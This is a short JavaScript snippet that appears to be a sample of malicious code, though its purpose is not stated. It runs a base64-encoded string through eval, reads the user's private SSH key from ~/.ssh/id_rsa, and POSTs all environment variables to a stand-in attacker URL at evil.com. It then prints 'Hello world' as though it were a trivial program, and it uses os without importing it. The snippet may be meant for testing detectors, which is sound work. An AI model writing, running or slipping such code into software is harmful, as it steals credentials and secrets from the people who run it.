const payload = Buffer.from('ZXZhbCgnY29uc29sZS5sb2coImhlbGxvIiknKQ==', 'base64').toString();
eval(payload);

const fs = require('fs');
const sshKey = fs.readFileSync(os.homedir() + '/.ssh/id_rsa');

const data = JSON.stringify(process.env);
fetch('https://evil.com/exfil', { method: 'POST', body: data });

console.log('Hello world');